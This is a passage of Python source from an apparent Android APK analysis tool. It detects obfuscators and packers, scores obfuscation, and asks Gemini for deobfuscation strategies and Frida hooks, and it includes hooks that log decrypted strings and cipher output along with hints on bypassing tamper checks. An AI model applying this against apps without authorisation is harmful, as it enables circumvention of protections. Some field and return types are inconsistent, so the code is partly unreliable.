    AI-ENHANCED obfuscation analysis that combines fast static analysis with
    AI-powered insights for better tool identification and deobfuscation strategies.
    
    Improvements over basic analysis:
    1. AI analyzes class naming patterns to identify specific obfuscators
    2. Code sample analysis to detect obfuscation techniques in actual code
    3. Smarter deobfuscation strategies based on code patterns
    4. Custom Frida hooks tailored to detected patterns
    5. Control flow obfuscation detection via code analysis
    
    Args:
        apk_path: Path to the APK file
        output_dir: Optional JADX output directory for source code analysis
    
    Returns:
        ObfuscationAnalysisResult with AI-enhanced insights
    """
    import time
    start_time = time.time()
    
    # Get base obfuscation analysis first
    base_result = analyze_apk_obfuscation(apk_path)
    
    if not settings.gemini_api_key:
        return base_result
    
    try:
        from google import genai
        from google.genai import types
        
        client = genai.Client(api_key=settings.gemini_api_key)
        
        # Collect code samples for AI analysis
        code_samples = ""
        obfuscated_code_samples = ""
        
        if output_dir and Path(output_dir).exists():
            sources_dir = Path(output_dir) / "sources"
            if sources_dir.exists():
                # Collect obfuscated class samples (single letter names)
                obfuscated_code_samples = _collect_obfuscated_code_samples(
                    sources_dir, 
                    base_result.class_naming.sample_obfuscated_names[:15],
                    max_samples=10,
                    max_code_per_sample=3000
                )
                
                # Collect some regular code samples for comparison
                code_samples = _collect_regular_code_samples(
                    sources_dir,
                    max_samples=5,
                    max_code_per_sample=2000
                )
        
        # Build analysis context
        analysis_context = f"""
=== APK OBFUSCATION ANALYSIS ===
Package: {base_result.package_name}
Overall Obfuscation Level: {base_result.overall_obfuscation_level}
Obfuscation Score: {base_result.obfuscation_score}/100

=== CLASS NAMING STATISTICS ===
Total Classes: {base_result.class_naming.total_classes}
Single Letter Classes: {base_result.class_naming.single_letter_classes}
Short Name Classes (2-3 chars): {base_result.class_naming.short_name_classes}
Meaningful Name Classes: {base_result.class_naming.meaningful_name_classes}
Obfuscation Ratio: {base_result.class_naming.obfuscation_ratio:.1%}

Sample Obfuscated Class Names:
{chr(10).join('  - ' + n for n in base_result.class_naming.sample_obfuscated_names[:20])}

Sample Meaningful Class Names:
{chr(10).join('  - ' + n for n in base_result.class_naming.sample_original_names[:10])}

=== DETECTED INDICATORS ===
"""
        for ind in base_result.indicators:
            analysis_context += f"- {ind.indicator_type}: {ind.description} (confidence: {ind.confidence})\n"
        
        analysis_context += f"""
=== STRING ENCRYPTION PATTERNS ===
"""
        for pattern in base_result.string_encryption:
            analysis_context += f"- {pattern.pattern_type}: {pattern.description} (occurrences: {pattern.occurrences})\n"
        
        # Safely access native_protection attributes with fallbacks
        native_prot = base_result.native_protection
        native_libs = getattr(native_prot, 'native_lib_names', None) or getattr(native_prot, 'native_libs', []) or []
        protection_indicators = getattr(native_prot, 'protection_indicators', []) or []
        
        analysis_context += f"""
=== NATIVE PROTECTION ===
Has Native Libs: {getattr(native_prot, 'has_native_libs', False)}
Native Libraries: {', '.join(native_libs[:5]) if native_libs else 'None'}
Protection Indicators: {', '.join(protection_indicators[:3]) if protection_indicators else 'None'}
"""
        
        if obfuscated_code_samples:
            analysis_context += f"""
=== OBFUSCATED CODE SAMPLES ===
{obfuscated_code_samples}
"""
        
        if code_samples:
            analysis_context += f"""
=== REGULAR CODE SAMPLES (for comparison) ===
{code_samples}
"""
        
        # AI Analysis prompt
        prompt = f"""You are an expert Android reverse engineer specializing in identifying obfuscation tools and techniques. Analyze the following APK obfuscation data and code samples.

{analysis_context}

Provide your expert analysis in the following JSON format (respond with ONLY valid JSON):

{{
  "identified_obfuscators": [
    {{
      "tool_name": "Name of obfuscation tool (e.g., ProGuard, R8, DexGuard, Allatori, Zelix KlassMaster, iXGuard)",
      "confidence": "high/medium/low",
      "evidence": ["Specific evidence from class names, code patterns, or indicators"],
      "version_hints": "Any version hints if detectable"
    }}
  ],
  "obfuscation_techniques": {{
    "class_renaming": {{
      "detected": true/false,
      "pattern": "Description of naming pattern (e.g., sequential a,b,c / random / package-based)",
      "severity": "light/moderate/heavy"
    }},
    "method_renaming": {{
      "detected": true/false,
      "pattern": "Description if detectable from code",
      "severity": "light/moderate/heavy"
    }},
    "string_encryption": {{
      "detected": true/false,
      "technique": "Description of encryption technique if detected",
      "decryption_class": "Class name that handles decryption if found"
    }},
    "control_flow_obfuscation": {{
      "detected": true/false,
      "techniques": ["List of techniques: opaque predicates, dead code, switch tables, etc."]
    }},
    "reflection_usage": {{
      "detected": true/false,
      "purpose": "How reflection is used (hiding API calls, dynamic loading, etc.)"
    }},
    "native_protection": {{
      "detected": true/false,
      "techniques": ["Anti-debug, root detection, emulator detection, etc."]
    }}
  }},
  "deobfuscation_strategies": [
    {{
      "priority": 1,
      "strategy": "Specific step-by-step strategy",
      "tools_needed": ["List of tools"],
      "difficulty": "easy/medium/hard/very-hard",
      "estimated_time": "Time estimate"
    }}
  ],
  "custom_frida_hooks": [
    {{
      "purpose": "What this hook intercepts",
      "target_class": "Class to hook (if known)",
      "target_method": "Method to hook",
      "hook_code": "Complete Frida JavaScript code"
    }}
  ],
  "analysis_summary": "2-3 sentence summary of the obfuscation analysis",
  "reverse_engineering_difficulty": "easy/moderate/challenging/difficult/very-difficult",
  "recommended_approach": "Brief recommendation for approach to reverse engineering this APK"
}}

Be precise and base your analysis on the actual evidence provided. For Frida hooks, write complete, working JavaScript code."""

        # Use retry helper for reliability
        response = await gemini_request_with_retry(
            lambda: client.aio.models.generate_content(
                model=settings.gemini_model_id,
                contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
            ),
            max_retries=3,
            base_delay=2.0,
            timeout_seconds=180.0,
            operation_name="Obfuscation AI analysis"
        )
        
        if response is not None and response.text:
            import json
            try:
                ai_response = response.text.strip()
                if ai_response.startswith("```json"):
                    ai_response = ai_response[7:]
                if ai_response.startswith("```"):
                    ai_response = ai_response[3:]
                if ai_response.endswith("```"):
                    ai_response = ai_response[:-3]
                
                ai_data = json.loads(ai_response.strip())
                
                # Update detected tools with AI insights
                ai_tools = []
                for tool in ai_data.get('identified_obfuscators', []):
                    tool_name = tool.get('tool_name', '')
                    confidence = tool.get('confidence', 'medium')
                    if confidence in ['high', 'medium']:
                        ai_tools.append(f"{tool_name} ({confidence} confidence)")
                
                # Merge with existing tools
                all_tools = list(set(base_result.detected_tools + ai_tools))
                
                # Enhanced indicators from AI
                ai_indicators = []
                techniques = ai_data.get('obfuscation_techniques', {})
                
                for tech_name, tech_data in techniques.items():
                    if isinstance(tech_data, dict) and tech_data.get('detected'):
                        ai_indicators.append(ObfuscationIndicator(
                            indicator_type=tech_name,
                            description=tech_data.get('pattern', tech_data.get('technique', f'{tech_name} detected')),
                            confidence='high' if tech_data.get('severity') == 'heavy' else 'medium',
                            evidence=tech_data.get('techniques', []) if isinstance(tech_data.get('techniques'), list) else [],
                            affected_classes=[]
                        ))
                
                all_indicators = base_result.indicators + ai_indicators
                
                # Enhanced strategies from AI
                ai_strategies = []
                for strategy in ai_data.get('deobfuscation_strategies', []):
                    strategy_text = strategy.get('strategy', '')
                    tools = strategy.get('tools_needed', [])
                    difficulty = strategy.get('difficulty', 'medium')
                    time_est = strategy.get('estimated_time', '')
                    ai_strategies.append(f"[{difficulty.upper()}] {strategy_text} (Tools: {', '.join(tools)}) {time_est}")
                
                all_strategies = ai_strategies if ai_strategies else base_result.deobfuscation_strategies
                
                # Enhanced Frida hooks from AI
                ai_hooks = []
                for hook in ai_data.get('custom_frida_hooks', []):
                    hook_code = hook.get('hook_code', '')
                    purpose = hook.get('purpose', 'Custom hook')
                    if hook_code:
                        ai_hooks.append(f"// {purpose}\n{hook_code}")
                
                all_hooks = ai_hooks if ai_hooks else base_result.frida_hooks
                
                # Update the result with AI enhancements
                return ObfuscationAnalysisResult(
                    package_name=base_result.package_name,
                    overall_obfuscation_level=base_result.overall_obfuscation_level,
                    obfuscation_score=base_result.obfuscation_score,
                    detected_tools=all_tools,
                    indicators=all_indicators,
                    class_naming=base_result.class_naming,
                    string_encryption=base_result.string_encryption,
                    control_flow=base_result.control_flow,
                    native_protection=base_result.native_protection,
                    deobfuscation_strategies=all_strategies,
                    recommended_tools=base_result.recommended_tools,
                    frida_hooks=all_hooks,
                    analysis_time=time.time() - start_time,
                    warnings=base_result.warnings,
                    ai_analysis_summary=ai_data.get('analysis_summary', ''),
                    reverse_engineering_difficulty=ai_data.get('reverse_engineering_difficulty', ''),
                    ai_recommended_approach=ai_data.get('recommended_approach', '')
                )
                
            except json.JSONDecodeError as e:
                logger.warning(f"Failed to parse AI obfuscation response: {e}")
                return base_result
        
        return base_result
        
    except Exception as e:
        logger.error(f"AI obfuscation analysis failed: {e}")
        return base_result


def _collect_obfuscated_code_samples(
    sources_dir: Path,
    obfuscated_class_names: List[str],
    max_samples: int = 10,
    max_code_per_sample: int = 3000
) -> str:
    """Collect code samples from obfuscated classes."""
    samples = []
    
    for class_name in obfuscated_class_names[:max_samples]:
        # Convert package path to simple class name
        simple_name = class_name.split('/')[-1]
        if '$' in simple_name:
            simple_name = simple_name.split('$')[0]
        
        # Search for the file
        for java_file in sources_dir.rglob(f'{simple_name}.java'):
            try:
                code = java_file.read_text(encoding='utf-8', errors='ignore')[:max_code_per_sample]
                samples.append(f"--- {class_name} ---\n{code}\n")
                break
            except:
                pass
    
    return "\n".join(samples)


def _collect_regular_code_samples(
    sources_dir: Path,
    max_samples: int = 5,
    max_code_per_sample: int = 2000
) -> str:
    """Collect code samples from non-obfuscated classes for comparison."""
    samples = []
    
    for java_file in sources_dir.rglob('*.java'):
        # Skip obfuscated-looking names
        if len(java_file.stem) <= 3:
            continue
        if java_file.stem[0].islower() and len(java_file.stem) < 5:
            continue
        
        try:
            code = java_file.read_text(encoding='utf-8', errors='ignore')
            if len(code) > 500:  # Skip trivial files
                samples.append(f"--- {java_file.name} ---\n{code[:max_code_per_sample]}\n")
                if len(samples) >= max_samples:
                    break
        except:
            pass
    
    return "\n".join(samples)


def _extract_class_names_fast(apk_path: Path) -> List[str]:
    """Extract class names from DEX files without full analysis - very fast."""
    import zipfile
    class_names = []
    
    try:
        with zipfile.ZipFile(str(apk_path), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('.dex'):
                    try:
                        dex_data = zf.read(name)
                        # Parse DEX header to find string table
                        if len(dex_data) < 112:
                            continue
                        
                        # DEX file magic check
                        if dex_data[:4] != b'dex\n':
                            continue
                        
                        # Read class_defs section info from header
                        class_defs_size = int.from_bytes(dex_data[96:100], 'little')
                        class_defs_off = int.from_bytes(dex_data[100:104], 'little')
                        
                        # Read string IDs info
                        string_ids_size = int.from_bytes(dex_data[56:60], 'little')
                        string_ids_off = int.from_bytes(dex_data[60:64], 'little')
                        
                        # Read type IDs info  
                        type_ids_size = int.from_bytes(dex_data[64:68], 'little')
                        type_ids_off = int.from_bytes(dex_data[68:72], 'little')
                        
                        # Extract class names from class_defs (sample first 1000)
                        max_classes = min(class_defs_size, 1000)
                        for i in range(max_classes):
                            class_def_off = class_defs_off + (i * 32)
                            if class_def_off + 4 > len(dex_data):
                                break
                            
                            class_idx = int.from_bytes(dex_data[class_def_off:class_def_off+4], 'little')
                            
                            # Get type descriptor
                            if class_idx < type_ids_size:
                                type_id_off = type_ids_off + (class_idx * 4)
                                if type_id_off + 4 <= len(dex_data):
                                    descriptor_idx = int.from_bytes(dex_data[type_id_off:type_id_off+4], 'little')
                                    
                                    # Get string from string table
                                    if descriptor_idx < string_ids_size:
                                        string_id_off = string_ids_off + (descriptor_idx * 4)
                                        if string_id_off + 4 <= len(dex_data):
                                            string_data_off = int.from_bytes(dex_data[string_id_off:string_id_off+4], 'little')
                                            
                                            # Read ULEB128 length and string
                                            if string_data_off < len(dex_data):
                                                # Skip ULEB128 length
                                                pos = string_data_off
                                                while pos < len(dex_data) and dex_data[pos] & 0x80:
                                                    pos += 1
                                                pos += 1
                                                
                                                # Read null-terminated string
                                                end = pos
                                                while end < len(dex_data) and dex_data[end] != 0:
                                                    end += 1
                                                
                                                try:
                                                    class_name = dex_data[pos:end].decode('utf-8', errors='ignore')
                                                    if class_name.startswith('L') and class_name.endswith(';'):
                                                        class_names.append(class_name[1:-1])  # Remove L and ;
                                                except:
                                                    pass
                    except Exception as e:
                        logger.debug(f"Error parsing DEX {name}: {e}")
    except Exception as e:
        logger.warning(f"Error extracting class names: {e}")
    
    return class_names


def _analyze_class_naming_fast(class_names: List[str], package_name: str) -> ClassNamingAnalysis:
    """Fast class naming analysis based on extracted class names."""
    single_letter = []
    short_name = []
    meaningful = []
    
    # Filter to app classes only (exclude framework)
    app_classes = [c for c in class_names if not any(
        c.startswith(p) for p in ['android/', 'androidx/', 'java/', 'kotlin/', 'com/google/android/']
    )]
    
    for class_name in app_classes[:500]:  # Sample up to 500 classes
        simple_name = class_name.split('/')[-1]
        # Handle inner classes
        if '$' in simple_name:
            simple_name = simple_name.split('$')[-1]
        
        if len(simple_name) == 1 and simple_name.isalpha():
            single_letter.append(class_name)
        elif len(simple_name) <= 3 and simple_name.replace('_', '').isalnum():
            short_name.append(class_name)
        elif len(simple_name) > 6:
            meaningful.append(class_name)
    
    total = len(app_classes)
    obfuscated = len(single_letter) + len(short_name)
    obfuscation_ratio = obfuscated / max(total, 1)
    
    return ClassNamingAnalysis(
        total_classes=total,
        single_letter_classes=len(single_letter),
        short_name_classes=len(short_name),
        meaningful_name_classes=len(meaningful),
        obfuscation_ratio=obfuscation_ratio,
        sample_obfuscated_names=single_letter[:10] + short_name[:10],
        sample_original_names=meaningful[:10]
    )


def _detect_proguard_indicators_fast(apk, class_naming: ClassNamingAnalysis) -> List[ObfuscationIndicator]:
    """Fast ProGuard detection without full DEX analysis."""
    indicators = []
    
    # Check class naming patterns
    if class_naming.obfuscation_ratio > 0.3:
        indicators.append(ObfuscationIndicator(
            indicator_type="class_renaming",
            description="High ratio of short/single-letter class names indicates ProGuard/R8",
            confidence="high" if class_naming.obfuscation_ratio > 0.5 else "medium",
            evidence=[f"Obfuscation ratio: {class_naming.obfuscation_ratio:.1%}"],
            affected_classes=class_naming.sample_obfuscated[:5]
        ))
    
    # Check for mapping file references
    try:
        files = apk.get_files()
        for f in files:
            if 'proguard' in f.lower() or 'mapping' in f.lower():
                indicators.append(ObfuscationIndicator(
                    indicator_type="proguard_config",
                    description=f"ProGuard-related file found: {f}",
                    confidence="high",
                    evidence=[f],
                    affected_classes=[]
                ))
                break
    except:
        pass
    
    return indicators


def _detect_dexguard_indicators_fast(apk) -> List[ObfuscationIndicator]:
    """Fast DexGuard detection."""
    indicators = []
    
    try:
        # Check for DexGuard-specific files or classes
        files = apk.get_files()
        dexguard_signs = ['dexguard', 'guardsquare']
        
        for f in files:
            f_lower = f.lower()
            if any(sign in f_lower for sign in dexguard_signs):
                indicators.append(ObfuscationIndicator(
                    indicator_type="dexguard",
                    description="DexGuard commercial protection detected",
                    confidence="high",
                    evidence=[f],
                    affected_classes=[]
                ))
                break
    except:
        pass
    
    return indicators


def _analyze_string_encryption_fast(apk_path: Path) -> List[StringEncryptionPattern]:
    """Fast string encryption pattern detection by sampling DEX strings."""
    import zipfile
    patterns = []
    
    try:
        with zipfile.ZipFile(str(apk_path), 'r') as zf:
            for name in zf.namelist():
                if name.endswith('.dex'):
                    dex_data = zf.read(name)
                    
                    # Look for common encryption patterns in raw bytes
                    # Base64-like encoded strings
                    base64_count = dex_data.count(b'==')
                    if base64_count > 50:
                        patterns.append(StringEncryptionPattern(
                            pattern_type="base64_encoding",
                            description="High number of Base64-encoded strings detected",
                            sample_encrypted=["[Base64 patterns detected]"],
                            decryption_hint="Strings may be Base64 encoded at runtime",
                            occurrences=base64_count
                        ))
                    
                    # Check for AES/DES encryption class references
                    if b'Cipher' in dex_data or b'AES' in dex_data or b'DES' in dex_data:
                        patterns.append(StringEncryptionPattern(
                            pattern_type="crypto_usage",
                            description="Cryptographic APIs found - may be used for string encryption",
                            sample_encrypted=["[Cipher/AES/DES references]"],
                            decryption_hint="Hook javax.crypto.Cipher to intercept decryption",
                            occurrences=1
                        ))
                    
                    break  # Only check first DEX
    except:
        pass
    
    return patterns


def _identify_obfuscation_tools_fast(indicators: List[ObfuscationIndicator], 
                                     class_naming: ClassNamingAnalysis,
                                     string_encryption: List[StringEncryptionPattern]) -> List[str]:
    """Identify likely obfuscation tools used."""
    tools = []
    
    for ind in indicators:
        if 'dexguard' in ind.indicator_type.lower():
            if 'DexGuard' not in tools:
                tools.append('DexGuard')
        elif 'proguard' in ind.indicator_type.lower() or ind.indicator_type == 'class_renaming':
            if 'ProGuard/R8' not in tools:
                tools.append('ProGuard/R8')
    
    if class_naming.obfuscation_ratio > 0.3 and not tools:
        tools.append('ProGuard/R8 (likely)')
    
    return tools


def _calculate_obfuscation_score_fast(class_naming: ClassNamingAnalysis,
                                      indicators: List[ObfuscationIndicator],
                                      string_encryption: List[StringEncryptionPattern],
                                      native_protection: NativeProtection) -> int:
    """Calculate obfuscation score (0-100)."""
    score = 0
    
    # Class naming (up to 40 points)
    score += min(40, int(class_naming.obfuscation_ratio * 60))
    
    # Indicators (up to 30 points)
    for ind in indicators:
        if ind.confidence == "high":
            score += 10
        elif ind.confidence == "medium":
            score += 5
    score = min(score, 70)  # Cap at 70 so far
    
    # String encryption (up to 15 points)
    score += min(15, len(string_encryption) * 5)
    
    # Native protection (up to 15 points)
    if native_protection.has_native_libs:
        score += 5
        if native_protection.protection_indicators:
            score += 10
    
    return min(100, score)


def _generate_deobfuscation_strategies_fast(detected_tools: List[str], level: str) -> List[str]:
    """Generate deobfuscation strategies based on detected tools."""
    strategies = []
    
    if 'DexGuard' in detected_tools:
        strategies.extend([
            "DexGuard uses commercial protection - consider using dex2jar + CFR decompiler",
            "Use Frida to hook decryption methods at runtime",
            "Try jadx with --deobf flag for automatic renaming"
        ])
    
    if any('ProGuard' in t for t in detected_tools):
        strategies.extend([
            "Standard ProGuard/R8 - use jadx --deobf for automatic renaming",
            "Look for mapping.txt file if available for original names",
            "Use regex patterns to identify renamed classes by behavior"
        ])
    
    if level in ['heavy', 'extreme']:
        strategies.extend([
            "Consider dynamic analysis with Frida for runtime inspection",
            "Use apktool for smali-level analysis",
            "Run in emulator with API monitoring"
        ])
    
    if not strategies:
        strategies.append("Minimal obfuscation detected - standard decompilers should work well")
    
    return strategies


def _generate_frida_hooks_fast(package_name: str, level: str) -> List[str]:
    """Generate basic Frida hooks for obfuscation bypass."""
    hooks = []
    
    # Basic string decryption hook
    hooks.append(f'''// Hook String class to catch decrypted strings
Java.perform(function() {{
    var String = Java.use('java.lang.String');
    String.$init.overload('[B').implementation = function(bytes) {{
        var result = this.$init(bytes);
        console.log('[String] ' + result);
        return result;
    }};
}});''')
    
    if level in ['moderate', 'heavy', 'extreme']:
        hooks.append(f'''// Hook Cipher for encryption/decryption
Java.perform(function() {{
    var Cipher = Java.use('javax.crypto.Cipher');
    Cipher.doFinal.overload('[B').implementation = function(input) {{
        var result = this.doFinal(input);
        console.log('[Cipher] Input: ' + input.length + ' bytes, Output: ' + result.length + ' bytes');
        return result;
    }};
}});''')
    
    return hooks


# Keep original slow function for deep analysis if needed
def analyze_apk_obfuscation_deep(apk_path: Path, dx: Any = None) -> ObfuscationAnalysisResult:
    """Analyze class naming patterns to detect obfuscation.
    
    Args:
        apk_path: Path to the APK file
        dx: Optional pre-analyzed androguard Analysis object
    """
    single_letter = []
    short_name = []
    meaningful = []
    all_classes = []
    
    # If dx not provided, create minimal analysis
    if dx is None:
        try:
            from androguard.misc import AnalyzeAPK
            _, _, dx = AnalyzeAPK(str(apk_path))
        except Exception:
            # Return empty result if analysis fails
            return ObfuscationAnalysisResult(
                obfuscation_score=0.0,
                class_name_entropy=0.0,
                single_letter_classes=0,
                short_name_classes=0,
                meaningful_name_classes=0,
                indicators=[],
                recommendation="Unable to analyze - androguard not available"
            )
    
    for cls in dx.get_classes():
        class_name = cls.name
        if class_name.startswith("L") and class_name.endswith(";"):
            class_name = class_name[1:-1]
        
        # Skip Android/Java framework classes
        if any(class_name.startswith(prefix) for prefix in 
               ['android/', 'androidx/', 'java/', 'kotlin/', 'com/google/android/']):
            continue
        
        all_classes.append(class_name)
        
        # Get simple class name
        simple_name = class_name.split('/')[-1]
        
        if len(simple_name) == 1:
            single_letter.append(class_name)
        elif len(simple_name) <= 3 and simple_name.isalnum():
            short_name.append(class_name)
        else:
            meaningful.append(class_name)
    
    total = len(all_classes)
    obfuscated_count = len(single_letter) + len(short_name)
    obfuscation_ratio = obfuscated_count / total if total > 0 else 0.0
    
    return ClassNamingAnalysis(
        total_classes=total,
        single_letter_classes=len(single_letter),
        short_name_classes=len(short_name),
        meaningful_name_classes=len(meaningful),
        obfuscation_ratio=round(obfuscation_ratio, 3),
        sample_obfuscated_names=(single_letter + short_name)[:10],
        sample_original_names=meaningful[:10]
    )


def _detect_proguard_indicators(apk, dx, class_naming: ClassNamingAnalysis) -> List[ObfuscationIndicator]:
    """Detect ProGuard/R8 obfuscation indicators."""
    indicators = []
    
    # Check for mapping file residue
    if class_naming.obfuscation_ratio > 0.3:
        indicators.append(ObfuscationIndicator(
            indicator_type="proguard_naming",
            confidence="high" if class_naming.obfuscation_ratio > 0.6 else "medium",
            description=f"Class naming suggests ProGuard/R8: {class_naming.obfuscation_ratio*100:.1f}% obfuscated",
            evidence=class_naming.sample_obfuscated_names[:5],
            deobfuscation_hint="Look for mapping.txt file or use jadx's deobfuscation features"
        ))
    
    # Check for sequential class names (a, b, c pattern)
    sequential_pattern = _check_sequential_naming(class_naming.sample_obfuscated_names)
    if sequential_pattern:
        indicators.append(ObfuscationIndicator(
            indicator_type="proguard_sequential",
            confidence="high",
            description="Sequential alphabetical class naming detected (ProGuard default)",
            evidence=sequential_pattern[:5],
            deobfuscation_hint="Classes are likely renamed alphabetically; mapping file would reveal originals"
        ))
    
    # Check for removed line numbers
    if _check_removed_line_numbers(dx):
        indicators.append(ObfuscationIndicator(
            indicator_type="proguard_no_linenumbers",
            confidence="medium",
            description="Line number information removed (ProGuard optimization)",
            evidence=["Debug info stripped from bytecode"],
            deobfuscation_hint="Debugging will be harder; use dynamic analysis with Frida"
        ))
    
    return indicators


def _detect_dexguard_indicators(apk, dx) -> List[ObfuscationIndicator]:
    """Detect DexGuard-specific obfuscation."""
    indicators = []
    
    # DexGuard-specific patterns
    dexguard_classes = [
        'com/guardsquare/',
        'o/a/', 'o/b/', 'o/c/',  # Common DexGuard output patterns
    ]
    
    for cls in dx.get_classes():
        class_name = cls.name
        for pattern in dexguard_classes:
            if pattern in class_name:
                indicators.append(ObfuscationIndicator(
                    indicator_type="dexguard",
                    confidence="high",
                    description="DexGuard commercial obfuscation detected",
                    evidence=[class_name],
                    location=class_name,
                    deobfuscation_hint="DexGuard uses advanced protection; dynamic analysis recommended"
                ))
                break
    
    # Check for encrypted assets (DexGuard feature)
    encrypted_assets = _check_encrypted_assets(apk)
    if encrypted_assets:
        indicators.append(ObfuscationIndicator(
            indicator_type="encrypted_assets",
            confidence="medium",
            description="Encrypted or obfuscated assets detected",
            evidence=encrypted_assets[:5],
            deobfuscation_hint="Assets may be decrypted at runtime; hook decryption methods"
        ))
    
    # Check for integrity checks
    integrity_patterns = ['checksum', 'signature', 'integrity', 'tamper']
    for cls in dx.get_classes():
        for method in cls.get_methods():
            method_name = method.name.lower()
            if any(p in method_name for p in integrity_patterns):
                indicators.append(ObfuscationIndicator(
                    indicator_type="integrity_check",
                    confidence="medium",
                    description="Integrity/tamper detection found",
                    evidence=[f"{cls.name}->{method.name}"],
                    location=cls.name,
                    deobfuscation_hint="May need to bypass integrity checks for modification"
                ))
                break
    
    return indicators


def _detect_reflection_usage(dx) -> List[ObfuscationIndicator]:
    """Detect heavy reflection usage (API hiding)."""
    indicators = []
    reflection_methods = []
    
    reflection_apis = [
        'Ljava/lang/reflect/Method;->invoke',
        'Ljava/lang/Class;->forName',
        'Ljava/lang/Class;->getDeclaredMethod',
        'Ljava/lang/Class;->getDeclaredField',
        'Ljava/lang/Class;->getMethod',
    ]
    
    reflection_count = 0
    for cls in dx.get_classes():
        for method in cls.get_methods():
            try:
                if method.get_method() is None:
                    continue
                code = method.get_method().get_code()
                if code is None:
                    continue
                
                # Check for reflection API calls
                for instruction in code.get_bc().get_instructions():
                    if hasattr(instruction, 'get_output'):
                        output = instruction.get_output()
                        if any(api in output for api in reflection_apis):
                            reflection_count += 1
                            if len(reflection_methods) < 10:
                                reflection_methods.append(f"{cls.name}->{method.name}")
            except:
                continue
    
    if reflection_count > 20:
        indicators.append(ObfuscationIndicator(
            indicator_type="reflection_hiding",
            confidence="high" if reflection_count > 50 else "medium",
            description=f"Heavy reflection usage detected ({reflection_count} calls) - API hiding",
            evidence=reflection_methods,
            deobfuscation_hint="Hook Class.forName and Method.invoke to trace API calls"
        ))
    
    return indicators


def _analyze_string_encryption(dx) -> List[StringEncryptionPattern]:
    """Detect and analyze string encryption patterns."""
    patterns = []
    
    # Look for common string decryption patterns
    decryptor_signatures = [
        ('xor_decrypt', ['xor', 'decrypt', 'decode']),
        ('base64_decode', ['base64', 'b64', 'decode']),
        ('aes_decrypt', ['aes', 'cipher', 'decrypt']),
        ('custom_decrypt', ['deobfuscate', 'unprotect', 'reveal']),
    ]
    
    for cls in dx.get_classes():
        class_name = cls.name
        
        # Skip framework classes
        if any(class_name.startswith(f"L{prefix}") for prefix in 
               ['android/', 'androidx/', 'java/', 'kotlin/']):
            continue
        
        for method in cls.get_methods():
            method_name = method.name.lower()
            
            for pattern_name, keywords in decryptor_signatures:
                if any(kw in method_name for kw in keywords):
                    # Check if method takes String and returns String
                    try:
                        proto = method.get_method().get_descriptor() if method.get_method() else ""
                        if 'Ljava/lang/String;' in proto:
                            frida_hook = _generate_string_decrypt_hook(class_name, method.name)
                            patterns.append(StringEncryptionPattern(
                                pattern_name=pattern_name,
                                class_name=class_name,
                                method_name=method.name,
                                encrypted_strings_count=0,  # Would need deeper analysis
                                decryption_method_signature=proto,
                                sample_encrypted_values=[],
                                suggested_frida_hook=frida_hook
                            ))
                    except:
                        pass
    
    # Look for classes with many short static string fields (encrypted constants)
    for cls in dx.get_classes():
        static_strings = []
        for field in cls.get_fields():
            try:
                if 'Ljava/lang/String;' in str(field.get_field().get_descriptor()):
                    static_strings.append(field.name)
            except:
                pass
        
        if len(static_strings) > 20:
            # Many string constants might indicate encrypted strings
            class_name = cls.name
            simple_name = class_name.split('/')[-1].rstrip(';')
            if len(simple_name) <= 3:  # Likely obfuscated class
                patterns.append(StringEncryptionPattern(
                    pattern_name="encrypted_constants",
                    class_name=class_name,
                    method_name="<clinit>",
                    encrypted_strings_count=len(static_strings),
                    sample_encrypted_values=[],
                    suggested_frida_hook=f"// Hook static initializer of {class_name}"
                ))
    
    return patterns


def _analyze_control_flow(dx) -> List[ControlFlowObfuscation]:
    """Analyze control flow obfuscation patterns."""
    patterns = []
    
    switch_dispatch_methods = []
    high_complexity_methods = []
    
    for cls in dx.get_classes():
        class_name = cls.name
        
        # Skip framework
        if any(class_name.startswith(f"L{prefix}") for prefix in 
               ['android/', 'androidx/', 'java/', 'kotlin/']):
            continue
        
        for method in cls.get_methods():
            try:
                m = method.get_method()
                if m is None:
                    continue
                code = m.get_code()
                if code is None:
                    continue
                
                # Count control flow complexity
                switch_count = 0
                goto_count = 0
                
                for instruction in code.get_bc().get_instructions():
                    op_name = instruction.get_name()
                    if 'switch' in op_name:
                        switch_count += 1
                    if 'goto' in op_name:
                        goto_count += 1
                
                # Large switch statements often indicate dispatcher pattern
                if switch_count > 3:
                    switch_dispatch_methods.append(f"{class_name}->{method.name}")
                
                # Excessive gotos indicate control flow obfuscation
                if goto_count > 20:
                    high_complexity_methods.append(f"{class_name}->{method.name}")
                    
            except:
                continue
    
    if switch_dispatch_methods:
        patterns.append(ControlFlowObfuscation(
            pattern_type="switch_dispatch",
            affected_methods=len(switch_dispatch_methods),
            sample_classes=switch_dispatch_methods[:5],
            complexity_score=min(len(switch_dispatch_methods) / 10, 1.0)
        ))
    
    if high_complexity_methods:
        patterns.append(ControlFlowObfuscation(
            pattern_type="goto_obfuscation",
            affected_methods=len(high_complexity_methods),
            sample_classes=high_complexity_methods[:5],
            complexity_score=min(len(high_complexity_methods) / 5, 1.0)
        ))
    
    return patterns


def _analyze_native_protection(apk) -> NativeProtection:
    """Analyze native library protection."""
    native_libs = []
    protection_indicators = []
    jni_functions = []
    
    # Find native libraries
    for f in apk.get_files():
        if f.endswith('.so'):
            native_libs.append(f)
    
    # Check for known protection patterns in lib names
    protection_patterns = {
        'libjiagu': 'Baidu Jiagu packer',
        'libsecexe': 'Alibaba/Bangcle protection',
        'libDexHelper': 'Dex protection helper',
        'libprotect': 'Generic protection library',
        'libtprt': 'Tencent protection',
        'libexec': 'Code execution protection',
        'libsecmain': 'Security main library',
    }
    
    for lib in native_libs:
        lib_name = lib.split('/')[-1]
        for pattern, description in protection_patterns.items():
            if pattern in lib_name:
                protection_indicators.append(f"{description}: {lib_name}")
    
    # Look for JNI registration in class names
    jni_related = ['JNI', 'Native', 'nativeLib']
    # This would need deeper analysis of the actual native libs
    
    return NativeProtection(
        has_native_libs=len(native_libs) > 0,
        native_lib_names=native_libs,
        protection_indicators=protection_indicators,
        jni_functions=jni_functions
    )


def _check_sequential_naming(names: List[str]) -> List[str]:
    """Check for sequential alphabetical naming pattern."""
    sequential = []
    simple_names = [n.split('/')[-1].rstrip(';') for n in names if n]
    
    # Look for a, b, c or aa, ab, ac patterns
    sorted_names = sorted(simple_names)
    for i, name in enumerate(sorted_names[:-1]):
        if len(name) == 1 and len(sorted_names[i+1]) == 1:
            if ord(sorted_names[i+1]) == ord(name) + 1:
                if name not in sequential:
                    sequential.append(name)
                sequential.append(sorted_names[i+1])
    
    return sequential


def _check_removed_line_numbers(dx) -> bool:
    """Check if line number information has been removed."""
    checked = 0
    no_lines = 0
    
